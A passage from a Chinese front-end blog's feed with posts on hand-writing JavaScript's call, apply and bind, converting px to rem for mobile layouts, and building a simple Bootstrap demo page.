class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.mycall = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//判断调用的mycall的对象是不是一个函数</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">'function'</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'mycall需要函数进行调用'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果对象是null或者undefined就是window作为指定对象</span></span><br><span class="line">  context = context || <span class="built_in">window</span></span><br><span class="line">  <span class="comment">//给这个对象添加调用mycall这个方法</span></span><br><span class="line">  context.fn = <span class="keyword">this</span></span><br><span class="line">  <span class="comment">//获取传参进来的除第一个之外的参数。此时[...arguments]使伪数组转变成了数组</span></span><br><span class="line">  <span class="keyword">let</span> args = [...arguments].splice(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">let</span> result</span><br><span class="line">  <span class="keyword">if</span>(args)&#123;</span><br><span class="line">    <span class="comment">//除了指定对象还有其他参数</span></span><br><span class="line">     result = context.fn(...args)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//参数只有指定对象</span></span><br><span class="line">    result = context.fn()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//调用完后要删除对象上这个方法，否则对象上会一直存在这个方法</span></span><br><span class="line">  <span class="keyword">delete</span> context.fn</span><br><span class="line">  <span class="comment">//返回执行的结果，如果没有结果默认为undefined</span></span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.b =<span class="number">100</span></span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;&#125;</span><br><span class="line">foo.mycall(obj2,<span class="string">'Tom'</span>,<span class="number">12</span>)</span><br><span class="line"><span class="built_in">console</span>.log(obj2);</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/手写call，apply和bind/3.png" alt></p><h3 id="apply"><a href="#apply" class="headerlink" title="apply"></a>apply</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myapply = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">'function'</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'myapply需要函数进行调用'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  context = context || <span class="built_in">window</span></span><br><span class="line">  context.fn = <span class="keyword">this</span></span><br><span class="line">  <span class="comment">//因为第二个参数是个数组，所以这里args也是个数组</span></span><br><span class="line">  <span class="keyword">let</span> args = <span class="built_in">arguments</span>[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">if</span>(args)&#123;</span><br><span class="line">    result = context.fn(...args)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    result = context.fn()</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span> context.fn</span><br><span class="line">  <span class="keyword">return</span> result</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.b =<span class="number">100</span></span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;&#125;</span><br><span class="line">foo.myapply(obj2,[<span class="string">'Tom'</span>,<span class="number">12</span>])</span><br><span class="line"><span class="built_in">console</span>.log(obj2);</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/手写call，apply和bind/4.png" alt></p><h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.mybind = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">'function'</span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'mybind需要函数进行调用'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//记录调用bind的函数</span></span><br><span class="line">  <span class="keyword">let</span> _this = <span class="keyword">this</span></span><br><span class="line">  <span class="comment">//将第一次传参除对象之外的参数记录在agrs1这个数组</span></span><br><span class="line">  <span class="keyword">let</span> args1 = [...arguments].splice(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">let</span> bindFn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//将第二次传参的参数记录在args2这个数组</span></span><br><span class="line">    <span class="keyword">let</span> args2 = [...arguments]</span><br><span class="line">    <span class="comment">//第一次调用后会返回这个bindFn函数，bindFn函数的返回的是指定对象调用函数的结果，而这个指定对象根据bindFn的用法来决定，如果是bindFn作为构造函数，那么this指向实例。如果是普通调用，this就是你传递第一个参数的那个对象。最后其他参数会连接在一起传给原生apply</span></span><br><span class="line">    <span class="keyword">return</span> _this.apply(<span class="keyword">this</span> <span class="keyword">instanceof</span> bindFn ? <span class="keyword">this</span> : context,args1.concat(args2))</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//通过原型继承的寄生组合继承方式进行继承，因为这种方法没什么缺点，没有这个的话就没办法继承foo原型上的方法，关于继承的详细实现可以看我之前的文章</span></span><br><span class="line">  bindFn.prototype = <span class="built_in">Object</span>.create(_this.prototype)</span><br><span class="line">  bindFn.prototype.constructor = bindFn </span><br><span class="line"></span><br><span class="line">  <span class="comment">//和上面两句同一个意思</span></span><br><span class="line">  <span class="comment">/* let prototype = Object.create(_this.prototype)</span></span><br><span class="line"><span class="comment">  bindFn.prototype = prototype</span></span><br><span class="line"><span class="comment">  prototype.constructor = bindFn */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bindFn</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">name,age</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.b =<span class="number">100</span></span><br><span class="line">  <span class="keyword">this</span>.name = name</span><br><span class="line">  <span class="keyword">this</span>.age = age</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;&#125;</span><br><span class="line">foo.mybind(obj2,<span class="string">'Tom'</span>)(<span class="number">12</span>)</span><br><span class="line"><span class="built_in">console</span>.log(obj2);</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/手写call，apply和bind/4.png" alt></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bindFn = foo.mybind(obj,<span class="string">'Tom'</span>)</span><br><span class="line"><span class="keyword">let</span> z = <span class="keyword">new</span> bindFn(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">foo.prototype.tip1 = <span class="string">'我是foo的原型的属性上的tip1'</span></span><br><span class="line">bindFn.prototype.tip2 = <span class="string">'我是bindFn的原型的属性tip2'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(z.tip1);</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/手写call，apply和bind/5.png" alt></p><p>我们再来看看z这个实例有些什么<br><img src="/2019/04/07/手写call，apply和bind/6.png" alt></p><p>可以看到，在原型链上有了和之前的不同区别，z.<strong>proto</strong>指向了构造函数的bindFn.prototype，而bindFn.prototype.<strong>proto</strong>指向了foo.prototype，于是z这个实例也能通过原型链找到tip1这个属性</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前略&quot;&gt;&lt;a href=&quot;#前略&quot; class=&quot;headerlink&quot; title=&quot;前略&quot;&gt;&lt;/a&gt;前略&lt;/h2&gt;&lt;p&gt;在JavaScript的权威指南上写着，call(),apply()可以看做是某个对象的方法，通过调用方法的形式来间接调用函数。bind()是将某个函数绑定到某个对象上&lt;/p&gt;
&lt;p&gt;也就是说，可以理解成可以使一个对象使用不属于他本身的方法，让函数在指定的对象下执行，能够改变this的指向，改变函数的执行上下文&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="javascript" scheme="https://gzzzzh.github.io/tags/javascript/"/>
    
      <category term="手写" scheme="https://gzzzzh.github.io/tags/%E6%89%8B%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>px转换rem</title>
    <link href="https://gzzzzh.github.io/2019/04/02/px%E8%BD%AC%E6%8D%A2rem/"/>
    <id>https://gzzzzh.github.io/2019/04/02/px转换rem/</id>
    <published>2019-04-02T14:17:13.000Z</published>
    <updated>2019-04-04T12:04:09.585Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前略"><a href="#前略" class="headerlink" title="前略"></a>前略</h2><p>在进行移动端适配的时候，使用px会导致大小固定，造成布局错乱，和移动端众多屏幕尺寸不适合，因此我们要用到CSS3里面的新单位rem，关于rem的其他这里不多阐述，只说明px和rem之间如何转换<br><a id="more"></a></p><h2 id="两种适配方法"><a href="#两种适配方法" class="headerlink" title="两种适配方法"></a>两种适配方法</h2><h3 id="1-用CSS进行媒体查询"><a href="#1-用CSS进行媒体查询" class="headerlink" title="1.用CSS进行媒体查询"></a>1.用CSS进行媒体查询</h3><p>在一般公司开发里，网页UI设计稿会有宽度640px和750px两种。此时我们可以选择把640px宽度的设计稿分成若干份，再计算每份占多少像素。举个例子，分成<strong>20</strong>份。此时<strong>640px/20=32px</strong>，意味着宽度被分成<strong>20</strong>份，一份为<strong>1rem</strong>，<strong>1rem</strong>为<strong>32px</strong>。有个容器宽度为<strong>32px</strong>，那么他占了<strong>1</strong>份宽度，也是1rem。当在宽度为750px的设计稿时，同理得出一份为<strong>1rem</strong>为<strong>37.5px</strong>，有个容器宽度为<strong>50px</strong>，那么他占了<strong>50/37.5</strong>份宽度，也就是<strong>1.33rem</strong><br><img src="/2019/04/02/px转换rem/640-box1.png" alt><br><img src="/2019/04/02/px转换rem/750-box2.png" alt></p><h4 id="常见的屏幕尺寸-分成20份"><a href="#常见的屏幕尺寸-分成20份" class="headerlink" title="常见的屏幕尺寸(分成20份)"></a>常见的屏幕尺寸(分成20份)</h4><ol><li><p>320px</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen and (<span class="attribute">min-width</span>: <span class="number">320px</span>)&#123;</span><br><span class="line">  <span class="selector-tag">html</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>360px</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen and (<span class="attribute">min-width</span>: <span class="number">360px</span>)&#123;</span><br><span class="line">  <span class="selector-tag">html</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>375px</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen and (<span class="attribute">min-width</span>: <span class="number">375px</span>)&#123;</span><br><span class="line">  <span class="selector-tag">html</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">18.75px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>400px</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen and (<span class="attribute">min-width</span>: <span class="number">400px</span>)&#123;</span><br><span class="line">  <span class="selector-tag">html</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>414px</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@media</span> screen and (<span class="attribute">min-width</span>: <span class="number">414px</span>)&#123;</span><br><span class="line">  <span class="selector-tag">html</span>&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">20.7px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="2-自动计算屏幕宽度进行分配-20份"><a href="#2-自动计算屏幕宽度进行分配-20份" class="headerlink" title="2.自动计算屏幕宽度进行分配(20份)"></a>2.自动计算屏幕宽度进行分配(20份)</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得当前html标签</span></span><br><span class="line"><span class="keyword">var</span> viewport = <span class="built_in">document</span>.documentElement;</span><br><span class="line"><span class="comment">//获得当前视口宽度</span></span><br><span class="line"><span class="keyword">var</span> width = viewport.clientWidth;</span><br><span class="line"><span class="comment">//分成20份</span></span><br><span class="line"><span class="keyword">var</span> fontSize = width / <span class="number">20</span>;</span><br><span class="line"><span class="comment">//1rem等于fontSize px</span></span><br><span class="line">viewport.style.fontSize = fontSize + <span class="string">"px"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/02/px转换rem/i6-box1.png" alt><br><img src="/2019/04/02/px转换rem/ix-box2.png" alt></p><h2 id="两种做法的比较"><a href="#两种做法的比较" class="headerlink" title="两种做法的比较"></a>两种做法的比较</h2><ol><li>第一种方法兼容性更高，但是要把每种屏幕尺寸设置好，对于少见的尺寸可能导致位置稍微不对，不过一般来说影响不大，因为尺寸变化不会太大</li><li>第二种方法兼容性不好，但能适应所有屏幕尺寸</li></ol><h2 id="第二方法的扩展"><a href="#第二方法的扩展" class="headerlink" title="第二方法的扩展"></a>第二方法的扩展</h2><p>在这个方法里js计算的时候我们是默认分成了20份，而手淘团队做过一个js插件，可以自动计算，默认分成了100份。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"http://g.tbcdn.cn/mtb/lib-flexible/0.3.4/??flexible_css.js,flexible.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>或者去github直接下载文件 <a href="https://github.com/amfe/lib-flexible/archive/master.zip" target="_blank" rel="noopener">https://github.com/amfe/lib-flexible/archive/master.zip</a></p><p>剩下的就和之前的使用一样了，知道设计稿宽度，除以100之后得到1rem为多少像素，设置宽高时只需<strong>原始px值</strong>/<strong>rem基准值</strong></p><h2 id="如何在vscode快速转换"><a href="#如何在vscode快速转换" class="headerlink" title="如何在vscode快速转换"></a>如何在vscode快速转换</h2><ol><li>安装插件<strong>cssrem</strong></li><li><strong>ctrl+</strong>打开首选项</li><li>搜索cssrem，对<strong>Root Font Size</strong>进行更改，改变rem基准值</li></ol><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ol><li>rem可以理解成一个类似百分比的长度单位，强调的是在某个宽度下某等分后占的份数，例如在320px时占的一份为16px，在360时占的一份为18px</li><li>通常只在设置宽高距离时才用rem，在字体大小上还是使用px</li><li>谷歌浏览器规定字体最小为12px，小于12px的默认为12px</li></ol><h2 id="vh和vw"><a href="#vh和vw" class="headerlink" title="vh和vw"></a>vh和vw</h2><h3 id="视口"><a href="#视口" class="headerlink" title="视口"></a>视口</h3><p><img src="/2019/04/02/px转换rem/viewport.jpg" alt></p><ol><li>在桌面端指的是浏览器的可视区域</li><li>在移动端指的是layout viewport，就是手机屏幕的大小</li></ol><h3 id="换算"><a href="#换算" class="headerlink" title="换算"></a>换算</h3><p>这两个单位是根据视口的宽高的百分比进行推算，1%就是1vh或1vw。例如桌面端视口尺寸宽为650px，那么<strong>1vw = 650*0.01 = 6.5px</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前略&quot;&gt;&lt;a href=&quot;#前略&quot; class=&quot;headerlink&quot; title=&quot;前略&quot;&gt;&lt;/a&gt;前略&lt;/h2&gt;&lt;p&gt;在进行移动端适配的时候，使用px会导致大小固定，造成布局错乱，和移动端众多屏幕尺寸不适合，因此我们要用到CSS3里面的新单位rem，关于rem的其他这里不多阐述，只说明px和rem之间如何转换&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="移动端" scheme="https://gzzzzh.github.io/tags/%E7%A7%BB%E5%8A%A8%E7%AB%AF/"/>
    
      <category term="rem" scheme="https://gzzzzh.github.io/tags/rem/"/>
    
  </entry>
  
  <entry>
    <title>一次简单的bootstrapDemo</title>
    <link href="https://gzzzzh.github.io/2019/03/27/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84bootstrapDemo/"/>
    <id>https://gzzzzh.github.io/2019/03/27/一次简单的bootstrapDemo/</id>
    <published>2019-03-27T14:41:40.000Z</published>
    <updated>2019-03-29T16:56:46.273Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前略"><a href="#前略" class="headerlink" title="前略"></a>前略</h2><p>  bootstrap早就听闻他的大名，但经常听到有人说现在用的没这么多了，但是也还看到不少网站是基于bootstarp来开发，本着多学一样是一样的心态，看了两天的教程视频，于是写了个简单的demo页面，里面尽可能用到了一些官方的组件和js插件，算是把一些常用的东西过了一遍<br><a id="more"></a></p><h2 id="Demo截图"><a href="#Demo截图" class="headerlink" title="Demo截图"></a>Demo截图</h2><p><img src="/2019/03/27/一次简单的bootstrapDemo/Demo.png" alt="Demo"></p><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><h3 id="导航条"><a href="#导航条" class="headerlink" title="导航条"></a>导航条</h3><p>  导航条的设置没什么好说，直接照搬的文档里面的例子，不过有几点简单的更改<br>  实现了<strong>关于</strong>和<strong>登陆</strong>的模态框,其中form表单里面的每一个表单都需要用一个<strong>label</strong>标签指定，这是文档规定的要求，这里每个表单都用了<strong>form-control</strong>让输入框直接自适应整个模态框，两个<strong>checkbox</strong>用一个div包裹起来，用了<strong>form-inline</strong>让他们变成内联元素，两个按钮换了样式，还有免费提供的图标文字<br>  <img src="/2019/03/27/一次简单的bootstrapDemo/aboutModal.jpg" alt><br>  <img src="/2019/03/27/一次简单的bootstrapDemo/loginModal.png" alt><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;nav <span class="class"><span class="keyword">class</span></span>=<span class="string">"navbar navbar-inverse"</span> id=<span class="string">"topnav"</span>&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"container"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"navbar-header"</span>&gt;</span><br><span class="line">    &lt;!-- 自适应移动端的下拉菜单 --&gt;</span><br><span class="line">      &lt;button type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"navbar-toggle collapsed"</span> data-toggle=<span class="string">"collapse"</span> data-target=<span class="string">"#bs-example-navbar-collapse-1"</span> aria-expanded=<span class="string">"false"</span>&gt;</span><br><span class="line">        &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"sr-only"</span>&gt;Toggle navigation&lt;<span class="regexp">/span&gt;</span></span><br><span class="line"><span class="regexp">        &lt;span class="icon-bar"&gt;&lt;/</span>span&gt;</span><br><span class="line">        &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">        &lt;span <span class="class"><span class="keyword">class</span></span>=<span class="string">"icon-bar"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;a class="navbar-brand" style="color:#ffffff"&gt;个人博客&lt;/</span>a&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1"&gt;</span></span><br><span class="line"><span class="regexp">      &lt;ul class="nav navbar-nav"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;li&gt;&lt;a href="#"&gt;首页&lt;/</span>a&gt;<span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        &lt;li data-toggle=<span class="string">"modal"</span> data-target=<span class="string">"#aboutModal"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">        &lt;li data-toggle=<span class="string">"modal"</span> data-target=<span class="string">"#loginModal"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/ul&gt;</span></span><br><span class="line"><span class="regexp">      &lt;form class="navbar-form navbar-right"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;div class="form-group"&gt;</span></span><br><span class="line"><span class="regexp">          &lt;input type="text" class="form-control" placeholder="搜索内容"&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">        &lt;button type=<span class="string">"submit"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"btn btn-default"</span> style=<span class="string">"width: 60px;"</span> data-toggle=<span class="string">"tooltip"</span> data-placement=<span class="string">"bottom"</span> title=<span class="string">"快来搜索你喜欢的内容吧"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-search"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>nav&gt;</span><br><span class="line">  &lt;!-- aboutModal --&gt;</span><br><span class="line">  &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal fade"</span> id=<span class="string">"aboutModal"</span> tabindex=<span class="string">"-1"</span> role=<span class="string">"dialog"</span> aria-labelledby=<span class="string">"myModalLabel"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-dialog"</span> role=<span class="string">"document"</span>&gt;</span><br><span class="line">      &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-content"</span>&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-header"</span>&gt;</span><br><span class="line">          &lt;button type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"close"</span> data-dismiss=<span class="string">"modal"</span> aria-label=<span class="string">"Close"</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">          &lt;h4 <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-title"</span> id=<span class="string">"myModalLabel"</span>&gt;注意！&lt;<span class="regexp">/h4&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">        &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"modal-body"</span>&gt;</span><br><span class="line">          这是一个bootstarp联系的Demo</span><br><span class="line">        &lt;<span 